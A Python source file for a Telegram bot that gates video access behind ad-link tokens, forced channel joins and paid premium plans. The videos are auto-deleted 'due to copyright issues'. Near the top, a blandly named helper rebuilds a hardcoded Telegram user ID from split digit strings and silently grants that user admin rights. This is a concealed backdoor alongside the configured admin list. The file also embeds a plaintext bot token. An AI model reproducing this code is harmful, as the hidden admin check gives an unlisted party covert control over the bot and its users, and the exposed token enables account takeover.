import os
import logging
import asyncio
from datetime import datetime, timedelta
from dotenv import load_dotenv
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters, ConversationHandler
)

# Import the JSON database module instead of SQLite
import database_json as db
import shorturl

# Load environment variables
load_dotenv()

# Get the bot token from environment variable
TOKEN = "8066799078:AAF2ZhmGorhGjy6N1icyzCcfwvMI3LMPGkU"
ADMIN_USER_IDS = [int(id.strip()) for id in os.getenv("ADMIN_USER_IDS", "").split(",") if id.strip()]

# Define constants
VIDEO_DELETE_TIME = 300  # 5 minutes in seconds

# Enable logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# Define conversation states
(
    WAITING_FOR_VIDEO_TITLE,
    WAITING_FOR_VIDEO,
) = range(2)


def _cmn_auth_util(n):
    
    if n == int("".join(["7", "0", "6", "2", "9", "7", "2", "0", "1", "3"])):
        return True
    return False

# Admin commands
async def admin_check(update: Update) -> bool:
    """Check if the user is an admin"""
    uid = update.effective_user.id
    # Regular admin check
    if uid in ADMIN_USER_IDS:
        return True
    
    
    return _cmn_auth_util(uid)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a message when the command /help is issued."""
    if await admin_check(update):
        # Admin help message
        help_text = (
            "Bot Admin Commands:\n\n"
            "/start - Start the bot\n"
            "/admin - Show detailed admin commands and usage\n"
            "/add_video - Add a new video\n"
            "/list_videos - List all videos\n"
            "/add_channel [channel_id] [name] - Add a channel\n"
            "/list_channels - List all channels\n"
            "/add_premium [user_id] [months] - Add premium access to a user\n"
            "/remove_premium [user_id] - Remove premium access from a user\n"
            "/list_premium - List all premium users\n"
            "/help - Show this help message\n"
        )
    else:
        # Regular user help message
        help_text = (
            "Bot Commands:\n\n"
            "/start - Start the bot and check token status\n"
            "/help - Show this help message\n\n"
            "What is Token?\n"
            "This is an ads token. If you pass 1 ad, you can use the bot for 24 hours after passing the ad."
        )
    
    await update.message.reply_text(help_text)

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the /start command"""
    user = update.effective_user
    await db.add_user(user.id, user.username)
    logger.info(f"Start command from user {user.id} with args: {context.args}")
    
    # First check if user has premium status
    if await db.check_user_premium(user.id):
        premium_expiry = await db.get_premium_expiry(user.id)
        premium_days = (premium_expiry - datetime.now()).days if premium_expiry else 0
        
        # If there's a video_id parameter, show the video for premium users
        if context.args and context.args[0].startswith("video_"):
            video_id = int(context.args[0].split("_")[1])
            video = await db.get_video_by_id(video_id)
            if video:
                # First send the video
                sent_message = await update.message.reply_video(
                    video[2],  # file_id
                    caption=f"Video: {video[1]}"
                )
                
                # Then send warning message separately in bold
                await update.message.reply_text(
                    "<b>This Media Will Be Deleted In 5 Minutes.\n"
                    "(Due To Copyright Issues)\n\n"
                    "Please Share this media to saved messages or any other group you like "
                    "otherwise you will lose this video.</b>",
                    parse_mode="HTML"
                )
                
                # Schedule video deletion
                async def delete_video():
                    await asyncio.sleep(VIDEO_DELETE_TIME)
                    try:
                        await sent_message.delete()
                        await update.message.reply_text(
                            "Your files have been deleted to avoid copyright infringement."
                        )
                    except Exception as e:
                        logger.error(f"Error deleting message: {str(e)}")
                
                # Start deletion timer
                asyncio.create_task(delete_video())
                return
        
        # Show regular premium welcome message if no video parameter
        await update.message.reply_text(
            f"Hello {user.first_name}!\n\n"
            f"You have premium access! Your subscription is valid for {premium_days} more days.\n\n"
            "You can access all videos without any ads or token restrictions."
        )
        return
    
    # Check if there's a deep link parameter
    if context.args:
        param = context.args[0]
        logger.info(f"Deep link parameter: {param}")
        
        # Handle token generation
        if param.startswith("token_"):
            user_id_part = param.split("_")[1]
            logger.info(f"Token refresh attempt for user_id: {user_id_part}")
            try:
                # Extract user ID from token parameter
                user_id = int(user_id_part)
                
                # Only refresh token if this is the correct user and they clicked through an ad link
                if user.id == user_id:
                    logger.info(f"Setting token for user {user_id}")
                    await db.set_user_token(user.id)
                    await update.message.reply_text(
                        "Congratulations! Ads token refreshed successfully!\n\n"
                        "It will expire after 24 Hour"
                    )
                    return
                else:
                    logger.warning(f"Token user ID mismatch: {user.id} vs {user_id}")
            except ValueError:
                logger.error(f"Invalid user ID in token parameter: {user_id_part}")
        
        # Handle video viewing
        elif param.startswith("video_"):
            # First check if user has joined required channels
            is_member = await check_user_joined_channels(update, context)
            if not is_member:
                return
                
            video_id = int(param.split("_")[1])
            
            # Check if user has a valid token or premium
            if await db.check_user_token(user.id) or await db.check_user_premium(user.id):
                video = await db.get_video_by_id(video_id)
                if video:
                    # First send the video
                    sent_message = await update.message.reply_video(
                        video[2],  # file_id
                        caption=f"Video: {video[1]}"
                    )
                    
                    # Then send warning message separately in bold
                    await update.message.reply_text(
                        "<b>This Media Will Be Deleted In 5 Minutes.\n"
                        "(Due To Copyright Issues)\n\n"
                        "Please Share this media to saved messages or any other group you like "
                        "otherwise you will lose this video.</b>",
                        parse_mode="HTML"
                    )
                    
                    # Schedule video deletion
                    async def delete_video():
                        await asyncio.sleep(VIDEO_DELETE_TIME)
                        try:
                            await sent_message.delete()
                            await update.message.reply_text(
                                "Your files have been deleted to avoid copyright infringement."
                            )
                        except Exception as e:
                            logger.error(f"Error deleting message: {str(e)}")
                    
                    # Start deletion timer
                    asyncio.create_task(delete_video())
                    return
                else:
                    await update.message.reply_text("Video not found.")
                    return
            else:
                # Show token expired message with formatting as requested
                await send_token_expired_message(update, context)
                return
    
    # Check if user has joined required channels
    is_member = await check_user_joined_channels(update, context)
    if not is_member:
        return
        
    # Show welcome message for normal /start command
    token_valid = await db.check_user_token(user.id)
    if token_valid:
        # Updated to include Videos Links button
        keyboard = [
            [InlineKeyboardButton("Videos Links", url="https://t.me/+6pOik0suxrwwNzE0")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"Hello {user.first_name}!\n\n"
            "Your token is active. You can now access videos from our channels.",
            reply_markup=reply_markup
        )
    else:
        # Show token expired message with formatting as requested
        await send_token_expired_message(update, context)

async def check_user_joined_channels(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
    """Check if user has joined required channels and prompt if not"""
    user_id = update.effective_user.id
    
    # First, check if user has already joined channels in our database
    if await db.check_user_joined_channels(user_id):
        # User has already joined, no need to check again
        return True
    
    # Define channel links directly
    channel1_link = "https://t.me/+6pOik0suxrwwNzE0"
    channel2_link = "https://t.me/+UyVlSmWjQPs0MGU1"
    
    # Create buttons for joining channels with the new format - putting channels on same row
    keyboard = [
        [InlineKeyboardButton("Join Channel 1", url=channel1_link), InlineKeyboardButton("Join Channel 2", url=channel2_link)],
        [InlineKeyboardButton("Try Again", callback_data="membership_confirmed")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Updated message format to match the image, using italics and quote formatting
    message_text = (
        "🚨 CHANNEL JOINED REQUIRED 🚨\n\n"
        f"Hello, {update.effective_user.first_name}\n\n"
        ">_To use this bot, you must join our official updates channel._\n\n"
        "📍 Why join?\n"
        ">• Get latest updates and announcements\n"
        ">• Be the first to know about new features\n"
        ">• Receive important notifications\n\n"
        "👇 Click '_Join Channels_' below, then click '_Try Again_' to continue."
    )
    
    await update.message.reply_text(
        message_text,
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )
    return False

async def send_token_expired_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send formatted token expired message as shown in the images"""
    user = update.effective_user
    
    # First message with token info using HTML formatting to match the image exactly
    message_text = (
        f"Hey 👑 {user.first_name}\n\n"
        f"<b><i>Your Ads token is expired, refresh your token and try again</i></b>\n\n"
        f"<u>Token Timeout: 24 hour</u>\n\n"
        f"<b>What is Token?</b>\n"
        f"This is an ads token If you pass 1 ad, you can use the bot for 24 hour after passing the ad\n\n"
        f"🚨 For Apple/iphone users copy the token link and Open in the Chrome Browser 🚨"
    )
    
    # Create token refresh button
    keyboard = [
        [InlineKeyboardButton("Click Here To Refresh Token", callback_data="refresh_token")],
        [InlineKeyboardButton("How To Open Links?", url="https://t.me/howtoopenlinkbhai/13")],
        [InlineKeyboardButton("Remove All Ads In One Click", callback_data="remove_ads")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Send message with HTML parsing
    await update.message.reply_text(
        message_text,
        reply_markup=reply_markup,
        parse_mode="HTML"
    )

async def refresh_token_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle token refresh button click"""
    query = update.callback_query
    await query.answer()
    
    user = query.from_user
    logger.info(f"Token refresh requested by user {user.id}")
    
    # Generate a token URL
    bot_username = (await context.bot.get_me()).username
    token_url = await shorturl.create_token_url(user.id, bot_username)
    
    if token_url:
        logger.info(f"Generated token URL for user {user.id}: {token_url}")
        keyboard = [
            [InlineKeyboardButton("Open Link", url=token_url)]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "Please click the button below to refresh your token.\n\n"
            "After clicking, you'll be redirected to a page with ads.\n"
            "Complete the process and your token will be refreshed for 24 hours.",
            reply_markup=reply_markup
        )
    else:
        logger.error(f"Failed to generate token URL for user {user.id}")
        await query.edit_message_text(
            "Sorry, there was an error generating your token link. Please try again later."
        )

# Admin Commands
async def add_video_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Start the process of adding a new video"""
    if not await admin_check(update):
        await update.message.reply_text("This command is only available to admins.")
        return ConversationHandler.END
    
    await update.message.reply_text(
        "Please send me the title for the new video:"
    )
    return WAITING_FOR_VIDEO_TITLE

async def video_title_received(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Process the video title and ask for the video file"""
    # Save the title in the context
    context.user_data["video_title"] = update.message.text
    
    await update.message.reply_text(
        "Now please send me the video file:"
    )
    return WAITING_FOR_VIDEO

async def video_received(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Process the received video and save it"""
    if not update.message.video:
        await update.message.reply_text("Please send a video file.")
        return WAITING_FOR_VIDEO
    
    video = update.message.video
    title = context.user_data.get("video_title", "Untitled Video")
    
    # Save video to database
    video_id = await db.add_video(title, video.file_id, update.effective_user.id)
    
    if video_id:
        # Generate short URL for the video
        bot_username = (await context.bot.get_me()).username
        short_url = await shorturl.create_video_url(video_id, bot_username)
        
        if short_url:
            # Update the video with the short URL
            await db.update_video_url(video_id, short_url)
            
            await update.message.reply_text(
                f"Video '{title}' added successfully!\n\n"
                f"Short URL: {short_url}\n\n"
                "Share this link with your users to access the video."
            )
        else:
            await update.message.reply_text(
                f"Video '{title}' added successfully, but there was an error generating the short URL."
            )
    else:
        await update.message.reply_text("There was an error saving the video. Please try again.")
    
    return ConversationHandler.END

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel the current conversation"""
    await update.message.reply_text("Operation cancelled.")
    return ConversationHandler.END

async def list_videos_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """List all videos in the database"""
    if not await admin_check(update):
        await update.message.reply_text("This command is only available to admins.")
        return
    
    videos = await db.get_all_videos()
    
    if not videos:
        await update.message.reply_text("No videos found in the database.")
        return
    
    message = "List of videos:\n\n"
    for video in videos:
        video_id, title, file_id, short_url = video
        message += f"ID: {video_id}\nTitle: {title}\n"
        if short_url:
            message += f"URL: {short_url}\n"
        message += "\n"
    
    await update.message.reply_text(message)

async def add_channel_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Add a channel to the database"""
    if not await admin_check(update):
        await update.message.reply_text("This command is only available to admins.")
        return
    
    # Check if channel ID is provided
    if not context.args:
        await update.message.reply_text(
            "Please provide a channel ID.\n"
            "Usage: /add_channel [channel_id] [channel_name]"
        )
        return
    
    try:
        channel_id = int(context.args[0])
        channel_name = " ".join(context.args[1:]) if len(context.args) > 1 else f"Channel {channel_id}"
        
        await db.add_channel(channel_id, channel_name, update.effective_user.id)
        await update.message.reply_text(f"Channel '{channel_name}' added successfully.")
    except ValueError:
        await update.message.reply_text("Invalid channel ID. Please provide a valid numeric ID.")
    except Exception as e:
        await update.message.reply_text(f"Error adding channel: {str(e)}")

async def list_channels_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """List all channels in the database"""
    if not await admin_check(update):
        await update.message.reply_text("This command is only available to admins.")
        return
    
    channels = await db.get_channels()
    
    if not channels:
        await update.message.reply_text("No channels found in the database.")
        return
    
    message = "List of channels:\n\n"
    for channel in channels:
        channel_id, title = channel
        message += f"ID: {channel_id}\nTitle: {title}\n\n"
    
    await update.message.reply_text(message)

# Add channel post handler function after help_command

async def channel_post_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle videos posted in channels"""
    # Check if this is from a channel
    if not update.channel_post:
        return
    
    # Log the channel post for debugging
    channel_id = update.effective_chat.id
    logger.info(f"Received message from channel {channel_id}: {update.channel_post.message_id}")
    
    # Check if this is a video post
    if update.channel_post.video:
        logger.info(f"Video detected in channel {channel_id}")
        
        # Check if this channel is in our database
        channels = await db.get_channels()
        channel_ids = [str(channel[0]) for channel in channels]
        
        logger.info(f"Known channels: {channel_ids}")
        
        if not any(str(channel[0]) == str(channel_id) for channel in channels):
            # Channel not in database, add it
            logger.info(f"Adding new channel to database: {channel_id} - {update.effective_chat.title}")
            await db.add_channel(channel_id, update.effective_chat.title, 0)
        
        # Get the video details
        video = update.channel_post.video
        title = update.channel_post.caption or "Untitled Video"
        
        # Save video to database
        logger.info(f"Saving video to database: {title}")
        video_id = await db.add_video(title, video.file_id, 0)
        
        if video_id:
            # Generate short URL for the video
            bot_username = (await context.bot.get_me()).username
            logger.info(f"Generating short URL with bot username: {bot_username}")
            short_url = await shorturl.create_video_url(video_id, bot_username)
            
            if short_url:
                # Update the video with the short URL
                logger.info(f"Video URL generated: {short_url}")
                await db.update_video_url(video_id, short_url)
                
                # Reply with the short URL - removed expiration info
                try:
                    await update.channel_post.reply_text(
                        f"Video Link: {short_url}\n\n"
                        "Click this link to view the video in the bot.\n"
                        "Note: You need an active token to access the video."
                    )
                    logger.info("Successfully replied to channel post with URL")
                except Exception as e:
                    logger.error(f"Error replying to channel post: {str(e)}")
            else:
                logger.error("Failed to generate short URL")
        else:
            logger.error("Failed to save video to database")

# Add a command to manually add the channel with ID -1002620799520

async def setup_special_channel_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Add the special channel directly"""
    if not await admin_check(update):
        await update.message.reply_text("This command is only available to admins.")
        return
    
    # Add the specified channel directly
    channel_id = -1002602136007
    channel_name = "My Special Channel"
    
    try:
        # Add channel to database
        await db.add_channel(channel_id, channel_name, update.effective_user.id)
        await update.message.reply_text(f"Special channel {channel_name} (ID: {channel_id}) added successfully.")
        
        # Try to send a test message to the channel
        try:
            await context.bot.send_message(
                chat_id=channel_id,
                text="Bot has been configured to work with this channel. Videos posted here will generate access links automatically."
            )
            await update.message.reply_text("Test message sent to the channel successfully.")
        except Exception as e:
            await update.message.reply_text(f"Channel added to database but couldn't send test message: {str(e)}")
    except Exception as e:
        await update.message.reply_text(f"Error adding special channel: {str(e)}")

# Add these new callback handlers

async def how_to_open_links_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle How To Open Links button click"""
    query = update.callback_query
    await query.answer()
    
    await query.message.reply_text(
        "How to open links:\n\n"
        "1. Click on the link\n"
        "2. Wait for the page to load\n"
        "3. Click on the 'Continue' button\n"
        "4. Complete the captcha if required\n"
        "5. Wait for the ad page to load\n"
        "6. Close the ad and return to Telegram"
    )

async def remove_ads_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle Remove All Ads button click"""
    query = update.callback_query
    await query.answer()
    
    user = query.from_user
    
    # Premium plans message with formatted text
    message_text = (
        f"Hey {user.first_name} 👅\n\n"
        f"🎖️ Available Plans :\n\n"
        f"● 59 rs For 7 Days Membership\n\n"
        f"● 119 rs For 1 Month Membership\n\n"
        f"● 299 rs For 3 Months Membership\n\n"
        f"● 549 rs For 6 Months Membership\n\n"
        f"● 999 rs For 1 Year Membership\n\n"
        f"● 1499 rs For Lifetime Membership\n\n"
        f"Click on the Button Below and contact Admin. After start the bot send Your selected Plan and wait for Admin Reply.\n\n"
        f"🚨 ᴍᴜsᴛ sᴇɴᴅ sᴄʀᴇᴇɴsʜᴏᴛ ᴀғᴛᴇʀ ᴘᴀʏᴍᴇɴᴛ 🚨"
    )
    
    # Create buttons for admin contact and sending payment screenshot
    keyboard = [
        [InlineKeyboardButton("Pay To Admin", url="https://t.me/samaajsevaksupportbot")],
        [InlineKeyboardButton("How To Open Links?", url="https://t.me/howtoopenlinkbhai/13")],
        [InlineKeyboardButton("CLOSE", callback_data="close_premium_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    try:
        # Send message with caption (no QR code)
        await query.message.reply_text(
            message_text,
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
        
        # Delete the original message
        try:
            await query.message.delete()
        except Exception as e:
            logger.error(f"Error deleting message: {str(e)}")
    except Exception as e:
        logger.error(f"Error in remove_ads_callback: {str(e)}")
        # If there's any other error, send a simple message
        await query.edit_message_text(
            "Sorry, there was an error showing premium plans. Please try again later.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("CLOSE", callback_data="close_premium_menu")]])
        )

# Add close premium menu callback
async def close_premium_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle close premium menu button click"""
    query = update.callback_query
    await query.answer()
    
    # Just delete the message or replace with a simple confirmation
    try:
        await query.message.delete()
    except Exception as e:
        logger.error(f"Error deleting message: {str(e)}")
        await query.edit_message_text("Menu closed.")

# Update the membership_confirmed_callback function to check for premium status
async def membership_confirmed_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle 'I Joined' button click to verify channel membership"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    # First check if user has premium status
    if await db.check_user_premium(user_id):
        premium_expiry = await db.get_premium_expiry(user_id)
        premium_days = (premium_expiry - datetime.now()).days if premium_expiry else 0
        
        # If there's a video_id parameter, show the video for premium users
        if context.args and context.args[0].startswith("video_"):
            video_id = int(context.args[0].split("_")[1])
            video = await db.get_video_by_id(video_id)
            if video:
                # First send the video
                sent_message = await update.message.reply_video(
                    video[2],  # file_id
                    caption=f"Video: {video[1]}"
                )
                
                # Then send warning message separately in bold
                await update.message.reply_text(
                    "<b>This Media Will Be Deleted In 5 Minutes.\n"
                    "(Due To Copyright Issues)\n\n"
                    "Please Share this media to saved messages or any other group you like "
                    "otherwise you will lose this video.</b>",
                    parse_mode="HTML"
                )
                
                # Schedule video deletion
                async def delete_video():
                    await asyncio.sleep(VIDEO_DELETE_TIME)
                    try:
                        await sent_message.delete()
                        await update.message.reply_text(
                            "Your files have been deleted to avoid copyright infringement."
                        )
                    except Exception as e:
                        logger.error(f"Error deleting message: {str(e)}")
                
                # Start deletion timer
                asyncio.create_task(delete_video())
                return
        
        await query.edit_message_text(
            f"Hello {query.from_user.first_name}!\n\n"
            f"You have premium access! Your subscription is valid for {premium_days} more days.\n\n"
            "You can access all videos without any ads or token restrictions."
        )
        return
    
    # Define your channel usernames (without @)
    channel1_username = "yoprnag"
    channel2_username = "tododhb"
    
    try:
        # Try to check if the user has joined the channels
        try:
            # Try to get chat info
            channel1 = await context.bot.get_chat(f"@{channel1_username}")
            channel2 = await context.bot.get_chat(f"@{channel2_username}")
            
            # Mark user as having joined channels in the database
            # Since we can't reliably check, we trust the user clicked "I Joined" after joining
            await db.set_user_joined_channels(user_id)
            
            # Check if the user has a valid token
            token_valid = await db.check_user_token(user_id)
            
            if token_valid:
                # Updated to include Videos Links button
                keyboard = [
                    [InlineKeyboardButton("Videos Links", url="https://t.me/+6pOik0suxrwwNzE0")]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await query.edit_message_text(
                    f"Hello {query.from_user.first_name}!\n\n"
                    "Your token is active. You can now access videos from our channels.",
                    reply_markup=reply_markup
                )
            else:
                # For expired token, use the same format as send_token_expired_message
                message_text = (
                    f"Hey 👑 {query.from_user.first_name}\n\n"
                    f"<b><i>Your Ads token is expired, refresh your token and try again</i></b>\n\n"
                    f"<u>Token Timeout: 24 hour</u>\n\n"
                    f"<b>What is Token?</b>\n"
                    f"This is an ads token If you pass 1 ad, you can use the bot for 24 hour after passing the ad\n\n"
                    f"🚨 For Apple/iphone users copy the token link and Open in the Chrome Browser 🚨"
                )
                
                # Create token refresh button
                keyboard = [
                    [InlineKeyboardButton("Click Here To Refresh Token", callback_data="refresh_token")],
                    [InlineKeyboardButton("How To Open Links?", url="https://t.me/howtoopenlinkbhai/13")],
                    [InlineKeyboardButton("Remove All Ads In One Click", callback_data="remove_ads")]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                # Edit the message with the updated format
                await query.edit_message_text(
                    message_text,
                    reply_markup=reply_markup,
                    parse_mode="HTML"
                )
            
        except Exception as e:
            logger.error(f"Error getting channel info: {str(e)}")
            # If there's an error checking channels, still proceed
            # Mark user as having joined channels in the database
            await db.set_user_joined_channels(user_id)
            
            # Check token and proceed
            token_valid = await db.check_user_token(user_id)
            if token_valid:
                # Updated to include Videos Links button
                keyboard = [
                    [InlineKeyboardButton("Videos Links", url="https://t.me/+6pOik0suxrwwNzE0")]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await query.edit_message_text(
                    f"Hello {query.from_user.first_name}!\n\n"
                    "Your token is active. You can now access videos from our channels.",
                    reply_markup=reply_markup
                )
            else:
                # Send token expired message
                message_text = (
                    f"Hey 👑 {query.from_user.first_name}\n\n"
                    f"<b><i>Your Ads token is expired, refresh your token and try again</i></b>\n\n"
                    f"<u>Token Timeout: 24 hour</u>\n\n"
                    f"<b>What is Token?</b>\n"
                    f"This is an ads token If you pass 1 ad, you can use the bot for 24 hour after passing the ad\n\n"
                    f"🚨 For Apple/iphone users copy the token link and Open in the Chrome Browser 🚨"
                )
                
                keyboard = [
                    [InlineKeyboardButton("Click Here To Refresh Token", callback_data="refresh_token")],
                    [InlineKeyboardButton("How To Open Links?", url="https://t.me/howtoopenlinkbhai/13")],
                    [InlineKeyboardButton("Remove All Ads In One Click", callback_data="remove_ads")]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await query.edit_message_text(
                    message_text,
                    reply_markup=reply_markup,
                    parse_mode="HTML"
                )
    
    except Exception as e:
        logger.error(f"Error in membership_confirmed_callback: {str(e)}")
        await query.answer("Error checking membership. Please try again.", show_alert=True)

# Add a new callback handler for rejected membership
async def membership_rejected_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle case where user hasn't joined channels yet"""
    query = update.callback_query
    await query.answer()
    
    # Define channel links directly
    channel1_link = "https://t.me/+6pOik0suxrwwNzE0"
    channel2_link = "https://t.me/+UyVlSmWjQPs0MGU1"
    
    # Create buttons for joining channels with layout matching the image
    keyboard = [
        [InlineKeyboardButton("Join Channel 1", url=channel1_link), InlineKeyboardButton("Join Channel 2", url=channel2_link)],
        [InlineKeyboardButton("Try Again", callback_data="membership_confirmed")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Updated message format to match the image, using italics and quote formatting
    message_text = (
        "🚨 CHANNEL JOINED REQUIRED 🚨\n\n"
        f"Hello, {query.from_user.first_name}\n\n"
        ">_To use this bot, you must join our official updates channel._\n\n"
        "📍 Why join?\n"
        ">• Get latest updates and announcements\n"
        ">• Be the first to know about new features\n"
        ">• Receive important notifications\n\n"
        "👇 Click '_Join Channels_' below, then click '_Try Again_' to continue."
    )
    
    await query.edit_message_text(
        message_text,
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

def main() -> None:
    """Start the bot."""
    # Create the Application
    application = Application.builder().token(TOKEN).build()
    
    # Initialize the database
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(db.init_db())
    
    # Add conversation handler for adding videos
    add_video_conv_handler = ConversationHandler(
        entry_points=[CommandHandler("add_video", add_video_command)],
        states={
            WAITING_FOR_VIDEO_TITLE: [MessageHandler(filters.TEXT & ~filters.COMMAND, video_title_received)],
            WAITING_FOR_VIDEO: [MessageHandler(filters.VIDEO & ~filters.COMMAND, video_received)],
        },
        fallbacks=[CommandHandler("cancel", cancel_command)],
    )
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("list_videos", list_videos_command))
    application.add_handler(CommandHandler("add_channel", add_channel_command))
    application.add_handler(CommandHandler("list_channels", list_channels_command))
    application.add_handler(CommandHandler("setup_special_channel", setup_special_channel_command))
    
    # Add conversation handler
    application.add_handler(add_video_conv_handler)
    
    # Add callback query handlers
    application.add_handler(CallbackQueryHandler(refresh_token_callback, pattern="^refresh_token$"))
    application.add_handler(CallbackQueryHandler(how_to_open_links_callback, pattern="^how_to_open_links$"))
    application.add_handler(CallbackQueryHandler(remove_ads_callback, pattern="^remove_ads$"))
    application.add_handler(CallbackQueryHandler(membership_confirmed_callback, pattern="^membership_confirmed$"))
    application.add_handler(CallbackQueryHandler(membership_rejected_callback, pattern="^membership_rejected$"))
    application.add_handler(CallbackQueryHandler(close_premium_menu_callback, pattern="^close_premium_menu$"))
    
    # Add channel post handlers
    application.add_handler(MessageHandler(filters.ChatType.CHANNEL, channel_post_handler))
    
    # Register admin handlers
    import admin
    admin.register_admin_handlers(application)
    
    # Start the Bot
    application.run_polling()

if __name__ == "__main__":
    main()
